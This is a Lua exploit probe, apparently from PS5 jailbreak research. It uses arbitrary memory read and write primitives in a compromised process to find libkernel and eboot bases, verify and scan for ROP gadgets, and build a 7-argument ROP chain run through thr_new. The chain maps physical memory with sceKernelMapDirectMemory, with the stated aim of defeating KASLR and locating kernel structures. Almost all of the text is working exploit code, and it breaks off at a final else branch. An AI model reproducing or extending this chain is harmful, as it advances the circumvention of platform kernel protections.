-- CRASH_CLASS: MODERATE
-- PROBE 528a: MapDirectMemory via ROP chain (7-arg call)
--
-- DEM9N101 confirmed (2026-10-25):
--   libkernel+0x17EF0 = sceKernelAllocateDirectMemory → works, returns phys addrs
--   libkernel+0x15020 = sceKernelMapDirectMemory (candidate) → crashes via fcall (7-arg)
--
-- The crash happens because fcall only forwards 6 register args (rdi..r9).
-- sceKernelMapDirectMemory is 7-arg: the 7th goes on the stack in System V ABI.
--
-- Strategy: use thr_new(455) child thread with a ROP chain that:
--   1. Calls sceKernelAllocateDirectMemory to get a physical address
--   2. Calls sceKernelMapDirectMemory with all 7 args via stack setup
--   3. Stores results to shared memory
--   4. Exits cleanly
--
-- If MapDirectMemory works → we have a direct physical memory mapping.
-- Then scan physical memory for kernel structures → KASLR defeated.
--
-- PS5 sceKernelMapDirectMemory signature (from PS4 SDK + DEM9N101 notes):
--   int sceKernelMapDirectMemory(void **addr, size_t len, int prot, int flags,
--                                 off_t directMemoryStart, size_t alignment)
-- Wait - that's 6 args. But DEM9N101 says it's the 7-arg *named* variant:
--   int sceKernelMapNamedDirectMemory(void **addr, size_t len, int prot,
--       int flags, off_t directMemoryStart, size_t alignment, const char *name)
-- With name=NULL it should work as the unnamed version.
--
-- Actually: try BOTH the 6-arg (via fcall) and 7-arg (via ROP) paths.
-- Section A: AllocateDirectMemory via fcall (known working)
-- Section B: MapDirectMemory via fcall with 6 args (may work if not named variant)
-- Section C: MapDirectMemory via child ROP with 7 args (name=NULL on stack)
-- Section D: If mapped, read physical memory for kernel discovery

print("=== PROBE 528a: MAP DIRECT MEMORY ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function fmt(v)
    if v == nil then return "nil" end
    local h, l = get_hi_lo(v)
    if h < 0 then h = h + 0x100000000 end
    if l < 0 then l = l + 0x100000000 end
    return string.format("0x%08X%08X", h, l)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)
local function alive() return N(native.fcall_with_rax(stub, 20)) == pid end

-- Get eboot base
local ib = memory.alloc(0x200)
wd(N(ib), 0x160)
pcall(function() mk(593)(uint64(0), ib) end)
local tlo = rd(N(ib) + 0x108) or 0
local thi = rd(N(ib) + 0x10C) or 0
if tlo < 0 then tlo = tlo + 0x100000000 end
if thi < 0 then thi = thi + 0x100000000 end
local eboot = uint64(string.format("0x%X%08X", thi, tlo))
print(string.format("eboot=0x%X%08X", thi, tlo))

local function eaddr(off)
    return uint64(string.format("0x%X%08X", thi, tlo + off))
end

-- Get libkernel base via dynlib_get_info(593) with handle 0x2001
local ib2 = memory.alloc(0x200)
wd(N(ib2), 0x160)
pcall(function() mk(593)(uint64(0x2001), ib2) end)
local lk_lo = rd(N(ib2) + 0x108) or 0
local lk_hi = rd(N(ib2) + 0x10C) or 0
if lk_lo < 0 then lk_lo = lk_lo + 0x100000000 end
if lk_hi < 0 then lk_hi = lk_hi + 0x100000000 end
print(string.format("libkernel_text=0x%X%08X", lk_hi, lk_lo))

if lk_lo == 0 and lk_hi == 0 then
    print("libkernel not at handle 0x2001, scanning all handles...")
    for h = 0, 0x100 do
        local ib3 = memory.alloc(0x200)
        wd(N(ib3), 0x160)
        local ok3, r3 = pcall(function() return mk(593)(uint64(h), ib3) end)
        if ok3 and N(r3) == 0 then
            local name_buf = memory.alloc(0x100)
            local name_off = 0
            for i = 0, 0x20 do
                local b = rd(N(ib3) + i)
                if b then
                    local c = b % 256
                    if c == 0 then break end
                end
            end
            local t_lo = rd(N(ib3) + 0x108) or 0
            local t_hi = rd(N(ib3) + 0x10C) or 0
            if t_lo < 0 then t_lo = t_lo + 0x100000000 end
            if t_hi < 0 then t_hi = t_hi + 0x100000000 end
            if t_lo ~= 0 or t_hi ~= 0 then
                print(string.format("  h=0x%X text=0x%X%08X", h, t_hi, t_lo))
            end
        end
    end
    print("Could not find libkernel base")
    return
end

local function lkaddr(off)
    return uint64(string.format("0x%X%08X", lk_hi, lk_lo + off))
end

-- Verify libkernel offsets by reading function prologues
print("")
print("[A] Verify libkernel function prologues")

local function check_prologue(name, off)
    local addr = N(lkaddr(off))
    local d = rd(addr)
    if d == nil then
        print(string.format("  %s (+0x%X): UNREADABLE", name, off))
        return false
    end
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256
    print(string.format("  %s (+0x%X): %02X %02X %02X %02X", name, off, b0, b1, b2, b3))
    return true
end

local lk_readable = check_prologue("GetDirectMemorySize", 0x17810)
check_prologue("AllocateDirectMemory", 0x17EF0)
check_prologue("MapDirectMemory_cand", 0x15020)
check_prologue("__error", 0x02E10)

if not lk_readable then
    print("libkernel text is XO (execute-only), cannot verify prologues")
    print("proceeding with offsets from DEM9N101 (behaviorally confirmed)")
end

if not alive() then print("DIED reading libkernel"); return end

-- [B] AllocateDirectMemory via fcall (known working from DEM9N101)
print("")
print("[B] sceKernelAllocateDirectMemory via fcall")
print("  signature: (searchStart, searchEnd, len, alignment, memoryType, &physOut)")

local phys_out = memory.alloc(8)
wq(phys_out, uint64(0xDEAD))

local alloc_fn = lkaddr(0x17EF0)
local alloc_rv = native.fcall_with_rax(alloc_fn, 0,
    uint64(0), uint64(0x150000000), uint64(0x4000),
    uint64(0x4000), uint64(0), uint64(N(phys_out)))

print("  ret=" .. fmt(alloc_rv) .. " (" .. N(alloc_rv) .. ")")
local phys_addr = rq(phys_out)
print("  phys_addr=" .. fmt(phys_addr))

local phys_ok = false
if phys_addr then
    local ph, pl = get_hi_lo(phys_addr)
    if ph < 0 then ph = ph + 0x100000000 end
    if pl < 0 then pl = pl + 0x100000000 end
    if ph ~= 0 or pl > 0x1000 then
        phys_ok = true
        print("  ALLOCATED physical memory!")
    else
        print("  phys_addr looks like zero/error")
    end
end

if not phys_ok then
    print("AllocateDirectMemory failed - cannot continue")
    print("alive=" .. tostring(alive()))
    return
end

if not alive() then print("DIED after alloc"); return end

-- [C] Try MapDirectMemory via fcall first (maybe it's 6-arg after all)
print("")
print("[C] sceKernelMapDirectMemory via fcall (6 args)")
print("  signature guess: (addr*, len, prot, flags, physAddr, alignment)")

local virt_out = memory.alloc(8)
wq(virt_out, uint64(0))

local map_fn = lkaddr(0x15020)
local map_rv = native.fcall_with_rax(map_fn, 0,
    uint64(N(virt_out)), uint64(0x4000), uint64(3),
    uint64(0x10), uint64(N(phys_addr)), uint64(0x4000))

print("  ret=" .. fmt(map_rv) .. " (" .. N(map_rv) .. ")")
local mapped_va = rq(virt_out)
print("  mapped_va=" .. fmt(mapped_va))

local map6_ok = false
if mapped_va then
    local mh, ml = get_hi_lo(mapped_va)
    if mh < 0 then mh = mh + 0x100000000 end
    if ml < 0 then ml = ml + 0x100000000 end
    if mh ~= 0 or ml > 0x1000 then
        map6_ok = true
        print("  *** 6-ARG MAP SUCCEEDED! va=" .. fmt(mapped_va) .. " ***")
        local test_rd = rd(N(mapped_va))
        print("  read test: " .. (test_rd ~= nil and string.format("0x%X", test_rd) or "FAULT"))
    end
end

if not map6_ok then
    print("  6-arg failed (expected — DEM9N101 saw crash)")
end

if not alive() then
    print("DIED in 6-arg map (expected crash from 7-arg function)")
    print("RE-RUN NEEDED: skip section C next time")
    return
end

-- [D] MapDirectMemory via child thread ROP (7 args)
print("")
print("[D] MapDirectMemory via child ROP chain (7 args)")

local sc455 = mk(455)
local sc_mmap = mk(477)

-- Gadget offsets (verified in earlier probes)
local G_POP_RAX = 0x992       -- pop rax; ret
local G_POP_RDI = 0xC9DFE     -- pop rdi; ret
local G_POP_RSI = 0xD77D      -- pop rsi; ret
local G_POP_RDX = 0x3B02D7    -- pop rdx; ret
local G_POP_RCX = 0xE64       -- pop rcx; ret
local G_MOV_RDI_RAX = 0x92C67 -- mov [rdi], rax; ret (was 0x98C67 in some probes - verify)
local G_RET = 0x42             -- bare ret

-- Verify key gadgets
print("  verifying gadgets...")
local function vg(name, off, expect, len)
    local addr = N(eboot) + off
    local d = rd(addr) or 0
    if d < 0 then d = d + 0x100000000 end
    local mask = 0
    for i = 0, len - 1 do mask = mask + 0xFF * (2 ^ (i * 8)) end
    local got = d % (mask + 1)
    local ok = (got == expect)
    if not ok then
        print(string.format("  MISMATCH %s: got 0x%X want 0x%X", name, got, expect))
    end
    return ok
end

local gadgets_ok = true
gadgets_ok = vg("pop_rax", G_POP_RAX, 0xC358, 2) and gadgets_ok
gadgets_ok = vg("pop_rdi", G_POP_RDI, 0xC35F, 2) and gadgets_ok
gadgets_ok = vg("pop_rsi", G_POP_RSI, 0xC35E, 2) and gadgets_ok
gadgets_ok = vg("pop_rdx", G_POP_RDX, 0xC35A, 2) and gadgets_ok
gadgets_ok = vg("pop_rcx", G_POP_RCX, 0xC359, 2) and gadgets_ok
gadgets_ok = vg("mov_rdi_rax", G_MOV_RDI_RAX, 0xC3078948, 4) and gadgets_ok
gadgets_ok = vg("ret", G_RET, 0xC3, 1) and gadgets_ok

if not gadgets_ok then
    print("  gadget mismatch — scanning for correct offsets...")
    -- Fall through: try alternate offsets from CLAUDE.md
    -- pop_rdi might be at 0x75DFE (from CHAIN_14_10.md) instead of 0xC9DFE
    if not vg("pop_rdi_alt", 0x75DFE, 0xC35F, 2) then
        print("  neither pop_rdi offset works, ABORT")
        return
    end
    G_POP_RDI = 0x75DFE
    print("  using alternate pop_rdi at +0x75DFE")
end

if not alive() then print("DIED during gadget check"); return end

-- Allocate fresh physical memory for this mapping attempt
local phys_out2 = memory.alloc(8)
wq(phys_out2, uint64(0xDEAD))
local alloc_rv2 = native.fcall_with_rax(alloc_fn, 0,
    uint64(0), uint64(0x150000000), uint64(0x4000),
    uint64(0x4000), uint64(0), uint64(N(phys_out2)))
print("  alloc2 ret=" .. N(alloc_rv2))
local phys2 = rq(phys_out2)
print("  phys2=" .. fmt(phys2))

if not phys2 or N(alloc_rv2) ~= 0 then
    print("  second allocation failed, reusing first")
    phys2 = phys_addr
end

if not alive() then print("DIED after alloc2"); return end

-- Build ROP chain for child thread
-- The chain will:
-- 1. Set up sysarch(SET_FSBASE=129, &fake_tcb) for errno safety
-- 2. Call MapDirectMemory with 7 args
-- 3. Store return value to result page
-- 4. Exit via thr_exit(431)
--
-- For a 7-arg function call in System V ABI:
--   rdi=arg1, rsi=arg2, rdx=arg3, rcx=arg4, r8=arg5, r9=arg6, [rsp]=arg7
-- We don't have pop r8/r9, but for this function call, we can use a different
-- approach: call the function via a call-gadget that sets up the stack properly.
--
-- Alternative: use the native syscall path. MapDirectMemory is a wrapper
-- around a Sony syscall. If we can identify which syscall, call it directly.
-- DEM9N101 says raw syscalls 546-554 return -1, but the wrapper might do
-- setup before the syscall (e.g., set credentials, adjust args).
--
-- Approach: call the wrapper function itself from ROP, with stack-passed 7th arg.
-- We need a gadget sequence that: set rdi,rsi,rdx,rcx, call [addr]
-- OR: since we control RSP, just simulate a function call:
--   push args on stack in reverse, set regs, then JMP to function
--
-- Simplest: lay out stack so ret pops into function entry, with 7th arg
-- already at the right stack position.
-- After setting rdi/rsi/rdx/rcx: the function's prologue will see
-- [rsp] = return_addr, [rsp+8] = 7th_arg... wait, r8/r9 are args 5/6.
--
-- We need r8 and r9 too. Problem: no pop r8/r9 in eboot (confirmed 386a).
-- But r8/r9 might be zero at child entry, or we can try to find an
-- indirect gadget. Let's check what r8/r9 ARE at child entry first.
--
-- From CLAUDE.md: "sysctl(6-arg) fails EFAULT: r8/r9 NOT zeroed at child entry"
-- So r8/r9 have garbage. We need to control them somehow.
--
-- For MapDirectMemory:
--   rdi = addr* (pointer to output VA)
--   rsi = len (0x4000)
--   rdx = prot (3 = RW)
--   rcx = flags (0x10 = MAP_FIXED? or other sony flag)
--   r8  = directMemoryStart (physical address from Allocate)
--   r9  = alignment (0x4000)
--   [rsp+8] = name (NULL for unnamed)
--
-- We MUST control r8 and r9. Let me search for indirect gadgets.
-- mov r8, rax or xchg r8, rax or similar

print("")
print("  scanning for r8/r9 control gadgets in eboot...")

local r8_gadgets = {}
local r9_gadgets = {}
local SCAN_LIMIT = 0x480000  -- ~4.5MB

for off = 0, SCAN_LIMIT - 4, 4 do
    local d = rd(N(eboot) + off)
    if d == nil then break end
    if d < 0 then d = d + 0x100000000 end
    local b0 = d % 256
    local b1 = math.floor(d / 256) % 256
    local b2 = math.floor(d / 65536) % 256
    local b3 = math.floor(d / 16777216) % 256

    -- 41 58 C3 = pop r8; ret
    if b0 == 0x41 and b1 == 0x58 and b2 == 0xC3 then
        r8_gadgets[#r8_gadgets + 1] = off
    end
    if b1 == 0x41 and b2 == 0x58 and b3 == 0xC3 then
        r8_gadgets[#r8_gadgets + 1] = off + 1
    end

    -- 41 59 C3 = pop r9; ret
    if b0 == 0x41 and b1 == 0x59 and b2 == 0xC3 then
        r9_gadgets[#r9_gadgets + 1] = off
    end
    if b1 == 0x41 and b2 == 0x59 and b3 == 0xC3 then
        r9_gadgets[#r9_gadgets + 1] = off + 1
    end

    -- 49 89 C0 C3 = mov r8, rax; ret
    if b0 == 0x49 and b1 == 0x89 and b2 == 0xC0 and b3 == 0xC3 then
        r8_gadgets[#r8_gadgets + 1] = off
    end

    -- 49 89 C1 C3 = mov r9, rax; ret
    if b0 == 0x49 and b1 == 0x89 and b2 == 0xC1 and b3 == 0xC3 then
        r9_gadgets[#r9_gadgets + 1] = off
    end

    -- 4C 8B 04 24 C3 = mov r8, [rsp]; ret (5 bytes, need next dword too)
    -- Skip complex multi-byte for now

    if off % 0x100000 == 0 and off > 0 then
        print(string.format("    scanned 0x%X bytes...", off))
    end
end

print(string.format("  r8 gadgets found: %d", #r8_gadgets))
for i, off in ipairs(r8_gadgets) do
    if i <= 5 then
        local d = rd(N(eboot) + off) or 0
        if d < 0 then d = d + 0x100000000 end
        print(string.format("    +0x%X: %08X", off, d))
    end
end

print(string.format("  r9 gadgets found: %d", #r9_gadgets))
for i, off in ipairs(r9_gadgets) do
    if i <= 5 then
        local d = rd(N(eboot) + off) or 0
        if d < 0 then d = d + 0x100000000 end
        print(string.format("    +0x%X: %08X", off, d))
    end
end

if not alive() then print("DIED during r8/r9 scan"); return end

-- If no pop r8/r9: try syscall approach instead.
-- The underlying syscall for MapDirectMemory might be:
-- sys 548 (batch VM ops) or a Sony-specific one.
-- DEM9N101 says raw 546-554 return -1, but the wrapper sets up the environment.
-- Try: call syscall directly from child thread with proper args.
-- Syscall only needs rax (number) + rdi..r9 (6 args max from our gadgets).
-- If MapDirectMemory uses sys 477 (mmap variant) internally with different flags...
-- Or: we find the syscall number by reading the wrapper's code.

if #r8_gadgets == 0 and #r9_gadgets == 0 then
    print("")
    print("[D-ALT] No r8/r9 gadgets. Reading MapDirectMemory wrapper code.")
    print("  looking for syscall number in wrapper...")

    -- Read first 32 bytes of the function
    for i = 0, 7 do
        local d = rd(N(lkaddr(0x15020)) + i * 4)
        if d then
            if d < 0 then d = d + 0x100000000 end
            print(string.format("    +%02X: %08X", i * 4, d))
        else
            print(string.format("    +%02X: UNREADABLE (XO)", i * 4))
            break
        end
    end

    -- Also read AllocateDirectMemory wrapper to find its syscall
    print("  AllocateDirectMemory wrapper bytes:")
    for i = 0, 7 do
        local d = rd(N(lkaddr(0x17EF0)) + i * 4)
        if d then
            if d < 0 then d = d + 0x100000000 end
            print(string.format("    +%02X: %08X", i * 4, d))
        else
            print(string.format("    +%02X: UNREADABLE (XO)", i * 4))
            break
        end
    end
end

-- [E] If we have r8 control, build the 7-arg ROP chain
if #r8_gadgets > 0 then
    print("")
    print("[E] Building 7-arg ROP chain for MapDirectMemory")

    local G_POP_R8 = r8_gadgets[1]
    local has_r9 = #r9_gadgets > 0
    local G_POP_R9 = has_r9 and r9_gadgets[1] or nil

    -- Allocate child resources
    local stack_sz = 0x200000  -- 2 MiB
    local cstack = sc_mmap(uint64(0), uint64(stack_sz), uint64(3),
        uint64(0x1002), uint64(0xFFFFFFFF), uint64(0))
    local result = memory.alloc(0x100)
    local virt_out_c = memory.alloc(8)
    wq(virt_out_c, uint64(0))

    -- Fake TCB for errno
    local tcb = memory.alloc(0x1000)
    for i = 0, 0xFFC, 4 do wd(N(tcb) + i, 0) end
    wq(tcb, uint64(N(tcb)))  -- self-referencing

    -- Sentinel in result
    for i = 0, 0x20, 8 do wq(uint64(N(result) + i), uint64(0xAAAABBBB)) end

    -- Build ROP chain on stack
    -- RSP starts at ((stack_base + stack_size) & ~0xF) - 8
    local rsp_start = math.floor((N(cstack) + stack_sz) / 16) * 16 - 8
    local pos = rsp_start

    local function push(val)
        pos = pos - 8
        wq(uint64(pos), val)
    end

    -- Build chain in reverse (stack grows down, but we lay out forward from rsp)
    -- Actually: thr_new sets RSP, and the first "ret" pops from [RSP].
    -- The start_func is the first gadget. With thr_new, start_func is called
    -- as a function: RSP points to a return address.
    -- So we need: start_func = first_gadget, and the stack has:
    --   [RSP]     = return address (next gadget)
    --   [RSP+8]   = ...
    -- Actually, start_func is called with CALL semantics: the CPU pushes the
    -- return address. But thr_new just JMPs to start_func with RSP set.
    -- In the FreeBSD kernel, thr_new copies start_func to trapframe RIP
    -- and stack_base+stack_size to RSP. So RSP is where we set it.
    --
    -- Layout: chain goes from low to high address (ROP pops upward).
    -- Start at the bottom of our writable area and go up.

    local chain_base = N(cstack) + stack_sz - 0x1000  -- leave headroom
    local chain_pos = chain_base

    local function emit(val)
        wq(uint64(chain_pos), val)
        chain_pos = chain_pos + 8
    end

    -- Step 1: sysarch(SET_FSBASE=129, &fake_tcb)
    -- sysarch is syscall 165
    -- rax=165, rdi=129, rsi=&tcb_ptr
    local tcb_ptr = memory.alloc(8)
    wq(tcb_ptr, uint64(N(tcb)))

    emit(eaddr(G_POP_RAX))      -- pop rax
    emit(uint64(165))            -- rax = 165 (sysarch)
    emit(eaddr(G_POP_RDI))      -- pop rdi
    emit(uint64(129))            -- rdi = SET_FSBASE
    emit(eaddr(G_POP_RSI))      -- pop rsi
    emit(uint64(N(tcb_ptr)))    -- rsi = &tcb_ptr

    -- Find syscall gadget (scan was done in 127a — use known offsets)
    -- Actually the syscall;ret scan is in section C of 127a. We need to find one.
    -- From 56s: 18 syscall hits in eboot, none followed by ret.
    -- From CHAIN_14_10.md: the chain uses libkernel's syscall stub directly.
    -- Let's use the same approach: call fn_addr which IS a syscall stub.
    -- But fn_addr is a Lua concept...
    -- Alternative: find 0F 05 C3 somewhere. Or use a call to libkernel.
    -- The simplest: use the known approach from CHAIN_14_10.md
    -- "pop rax; 431; syscall" — so there IS a syscall gadget that works
    -- The trick: there's no syscall;ret in eboot, but there's a syscall at
    -- a known offset that the chain uses. Let me check what CHAIN_14_10 actually uses.

    -- From docs: "pop rax; ret at +0x992, stack: [num][syscall;ret]..."
    -- This implies there IS a syscall;ret somewhere. But 56s says there isn't.
    -- Resolution: the child uses the syscall entry in libkernel, NOT eboot.
    -- libkernel has the syscall instruction at its syscall stub entry.

    -- Find libkernel's syscall stub. From earlier probes:
    -- stub = syscall.pipe.fn_addr — this is the loader's fn_addr
    -- For child thread, we need the actual address of "syscall; ret" in libkernel

    -- Let's read libkernel's text to find syscall;ret
    print("  looking for syscall;ret in libkernel...")
    local lk_syscall_ret = nil
    local lk_size_lo = rd(N(ib2) + 0x110) or 0
    if lk_size_lo < 0 then lk_size_lo = lk_size_lo + 0x100000000 end
    local lk_scan_max = math.min(lk_size_lo, 0x40000)  -- 256KB max

    for off = 0, lk_scan_max - 4, 4 do
        local d = rd(N(lkaddr(0)) + off)
        if d == nil then
            print("    libkernel is XO at offset " .. string.format("0x%X", off))
            break
        end
        if d < 0 then d = d + 0x100000000 end
        local b0 = d % 256
        local b1 = math.floor(d / 256) % 256
        local b2 = math.floor(d / 65536) % 256
        if b0 == 0x0F and b1 == 0x05 and b2 == 0xC3 then
            lk_syscall_ret = off
            print(string.format("    syscall;ret at libkernel+0x%X", off))
            break
        end
        if b1 == 0x0F and b2 == 0x05 then
            local b3 = math.floor(d / 16777216) % 256
            if b3 == 0xC3 then
                lk_syscall_ret = off + 1
                print(string.format("    syscall;ret at libkernel+0x%X", off + 1))
                break
            end
        end
    end

    if not lk_syscall_ret then
        print("    no syscall;ret found in readable libkernel")
        print("    libkernel .text may be XO")
        print("    ABORT: cannot build syscall chain without gadget")
        return
    end

    -- Now we have syscall;ret in libkernel. Rewrite chain:
    local SYSCALL_RET = lkaddr(lk_syscall_ret)

    -- Reset chain
    chain_pos = chain_base

    -- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr) for errno
    emit(eaddr(G_POP_RAX))
    emit(uint64(165))
    emit(eaddr(G_POP_RDI))
    emit(uint64(129))
    emit(eaddr(G_POP_RSI))
    emit(uint64(N(tcb_ptr)))
    emit(SYSCALL_RET)

    -- Step 2: Call MapDirectMemory wrapper (NOT syscall, the actual function)
    -- For a function call via ROP:
    --   set rdi = &virt_out_c
    --   set rsi = 0x4000 (len)
    --   set rdx = 3 (PROT_READ|PROT_WRITE)
    --   set rcx = 0x10 (flags - MAP_DIRECT?)
    --   set r8  = phys_addr
    --   set r9  = 0x4000 (alignment)
    --   push name=0 (7th arg on stack)
    --   push return_address (where to go after function returns)
    --   jmp to function
    --
    -- In ROP terms:
    --   pop rdi, pop rsi, pop rdx, pop rcx, pop r8, (pop r9 if available)
    --   then: at [rsp]: function_addr
    --         at [rsp+8]: return_addr_after_function
    --         at [rsp+0x10]: 7th arg (name = 0)
    -- Wait: when we "ret" into the function, RSP points to return_addr.
    -- The function expects [RSP] = return address, [RSP+8] = 7th arg.
    -- So stack layout when entering function:
    --   [RSP]   = where_to_return (next gadget)
    --   [RSP+8] = name (NULL)

    emit(eaddr(G_POP_RDI))
    emit(uint64(N(virt_out_c)))   -- rdi = &virt_out
    emit(eaddr(G_POP_RSI))
    emit(uint64(0x4000))          -- rsi = len
    emit(eaddr(G_POP_RDX))
    emit(uint64(3))               -- rdx = PROT_READ|PROT_WRITE
    emit(eaddr(G_POP_RCX))
    emit(uint64(0x10))            -- rcx = flags

    emit(eaddr(G_POP_R8))
    emit(uint64(N(phys2)))        -- r8 = physical address

    if has_r9 then
        emit(eaddr(G_POP_R9))
        emit(uint64(0x4000))      -- r9 = alignment
    end

    -- Now ret into MapDirectMemory function:
    emit(lkaddr(0x15020))         -- "call" MapDirectMemory

    -- After function returns, control comes back here.
    -- rax = return value. Store it.
    local store_after = chain_pos + 8 * 4  -- skip ahead for store sequence

    -- Return address points to store sequence:
    emit(eaddr(G_POP_RDI))       -- this is the "return address" from MapDirectMemory
    emit(uint64(N(result)))       -- rdi = result buffer
    emit(eaddr(G_MOV_RDI_RAX))   -- result[0] = rax (return value)

    -- The 7th argument (name) must be on the stack when MapDirectMemory is entered.
    -- Wait — I need to rethink the stack layout.
    -- When we ret into MapDirectMemory:
    --   [RSP] is popped as the target address (MapDirectMemory)
    --   Now RSP points to the next word.
    --   MapDirectMemory sees:
    --     [RSP]   = return address (our store sequence)
    --     [RSP+8] = 7th argument (name)
    -- So the layout should be:
    --   ... pop r8; [phys] ...
    --   MapDirectMemory address  <-- ret pops this, jumps to it
    --   store_gadget_addr        <-- MapDirectMemory's return address
    --   0x0000000000000000       <-- 7th arg: name = NULL

    -- Let me redo the end of chain properly:
    chain_pos = chain_base  -- restart

    -- Step 1: sysarch(SET_FSBASE=129, &tcb_ptr)
    emit(eaddr(G_POP_RAX))
    emit(uint64(165))
    emit(eaddr(G_POP_RDI))
    emit(uint64(129))
    emit(eaddr(G_POP_RSI))
    emit(uint64(N(tcb_ptr)))
    emit(SYSCALL_RET)

    -- Step 2: set up all regs for MapDirectMemory
    emit(eaddr(G_POP_RDI))
    emit(uint64(N(virt_out_c)))
    emit(eaddr(G_POP_RSI))
    emit(uint64(0x4000))
    emit(eaddr(G_POP_RDX))
    emit(uint64(3))
    emit(eaddr(G_POP_RCX))
    emit(uint64(0x10))
    emit(eaddr(G_POP_R8))
    emit(uint64(N(phys2)))

    if has_r9 then
        emit(eaddr(G_POP_R9))
        emit(uint64(0x4000))
    end

    -- "ret" into MapDirectMemory
    emit(lkaddr(0x15020))

    -- When MapDirectMemory executes, [RSP] = following words:
    -- save the chain_pos for the return address
    local ret_addr_pos = chain_pos
    emit(eaddr(G_POP_RDI))       -- return address (MapDirectMemory returns here)
    emit(uint64(0))               -- 7th arg: name = NULL

    -- Now fix: ret_addr_pos should point to our store sequence
    -- But MapDirectMemory sees [RSP] as return addr and [RSP+8] as 7th arg.
    -- So layout at call entry:
    --   [RSP+0] = return_addr  → pop_rdi gadget (for store sequence)
    --   [RSP+8] = name = NULL
    -- After MapDirectMemory returns, RSP is at ret_addr_pos, and "ret" pops
    -- the pop_rdi gadget address. Then pop_rdi pops... wait, the NULL.
    -- That's wrong. The NULL IS the 7th arg but also gets popped by pop_rdi.

    -- Fix: insert return trampoline
    -- [RSP+0] = addr of store_sequence_start
    -- [RSP+8] = name = NULL (consumed by MapDirectMemory, not by ret)
    -- After return, [RSP] = store_sequence_start (via the return)
    -- Hmm... after MapDirectMemory's `ret`, RSP points past the return addr.
    -- So RSP now points at the NULL (7th arg slot).
    -- Then the NULL gets used as the next gadget address → crash.

    -- Solution: after return_addr and 7th_arg, place the real continuation:
    chain_pos = ret_addr_pos  -- redo
    local store_start = ret_addr_pos + 16  -- skip return_addr + 7th_arg
    local store_addr = uint64(string.format("0x%X%08X",
        math.floor(store_start / 0x100000000),
        store_start % 0x100000000))

    emit(store_addr)              -- [RSP+0] = real return address (past the NULL)
    emit(uint64(0))               -- [RSP+8] = 7th arg: name = NULL
    -- After return, RSP is at store_start (RSP+0x10 from call entry)

    -- Store sequence: save rax (return value) to result
    emit(eaddr(G_POP_RDI))
    emit(uint64(N(result)))
    emit(eaddr(G_MOV_RDI_RAX))

    -- Store mapped VA from virt_out_c to result+8
    -- We can't easily do this in ROP — read it from Lua after join.

    -- Exit: thr_exit(431)
    emit(eaddr(G_POP_RAX))
    emit(uint64(431))
    emit(eaddr(G_POP_RDI))
    emit(uint64(0))
    emit(SYSCALL_RET)

    print(string.format("  chain built: %d bytes at 0x%X", chain_pos - chain_base, chain_base))

    -- Create thr_param
    local param = memory.alloc(0x40)
    for i = 0, 0x3C, 4 do wd(N(param) + i, 0) end
    wq(param, uint64(chain_base))                       -- start_func = chain start
    -- For ROP: start_func should be a "ret" gadget, and [RSP] = first real gadget
    -- Actually: thr_new jumps to start_func. If start_func IS the first pop gadget,
    -- and RSP points to the chain data (the values to pop), that works IF the
    -- chain data starts at the stack top.
    -- But we built the chain at chain_base, and RSP should point there.
    -- start_func = first gadget (pop rax), RSP = chain_base + 8 (data for pop rax)
    -- Wait: thr_new sets both RIP and RSP. RIP = start_func, RSP = stack_base + stack_size.
    -- We need RSP to point to our chain data. So:
    --   start_func = eaddr(G_RET)  (bare ret)
    --   RSP        = chain_base    (first word = first gadget address)
    -- The "ret" at start_func pops chain_base[0] = eaddr(G_POP_RAX) into RIP.
    -- Then G_POP_RAX pops chain_base[8] = 165 into rax. etc.

    wq(param, eaddr(G_RET))                              -- start_func = bare ret
    wq(uint64(N(param) + 0x08), uint64(0))               -- arg (unused)
    wq(uint64(N(param) + 0x10), uint64(N(cstack)))       -- stack_base
    wq(uint64(N(param) + 0x18), uint64(stack_sz))        -- stack_size

    -- Override RSP: thr_new sets RSP = stack_base + stack_size.
    -- But our chain is at chain_base = stack_base + stack_sz - 0x1000.
    -- So RSP starts at top of stack, far from our chain.
    -- Fix: put chain at the VERY TOP of stack, or adjust stack_size.
    -- RSP = stack_base + stack_size. Chain at chain_base.
    -- RSP needs to equal chain_base.
    -- stack_base + stack_size = chain_base
    -- chain_base = cstack + stack_sz - 0x1000
    -- So: set stack_size = stack_sz - 0x1000

    wq(uint64(N(param) + 0x18), uint64(stack_sz - 0x1000))  -- stack_size → RSP = chain_base

    local tid_p = memory.alloc(8)
    wq(tid_p, uint64(0))
    wq(uint64(N(param) + 0x30), uint64(N(tid_p)))        -- child_tid

    print("  launching child thread...")
    local ok_t, ret_t = pcall(function()
        return sc455(uint64(N(param)), uint64(0x38))
    end)
    print("  thr_new ret=" .. (ok_t and tostring(N(ret_t)) or "FAIL"))

    -- Wait for child to complete
    local x = 0; for k = 1, 200000 do x = x + k end

    if not alive() then
        print("  PROCESS DIED — MapDirectMemory crashed the process")
        return
    end

    local child_tid = rq(tid_p)
    print("  child_tid=" .. fmt(child_tid))

    local map_result = rq(uint64(N(result)))
    print("  MapDirectMemory return value=" .. fmt(map_result))

    local mapped = rq(virt_out_c)
    print("  mapped VA=" .. fmt(mapped))

    if map_result then
        local mr = N(map_result)
        if mr == 0 then
            print("  *** MAP DIRECT MEMORY SUCCEEDED! ***")
            if mapped then
                print("  reading mapped physical memory...")
                for i = 0, 7 do
                    local v = rq(uint64(N(mapped) + i * 8))
                    print(string.format("    [+0x%02X] = %s", i * 8, fmt(v)))
                end
            end
        else
            print(string.format("  MapDirectMemory failed: rv=%d (0x%X)", mr, mr < 0 and mr + 0x100000000 or mr))
        end
    end
else
    -- No r8/r9 gadgets — try the wrapper via syscall approach
    print("")
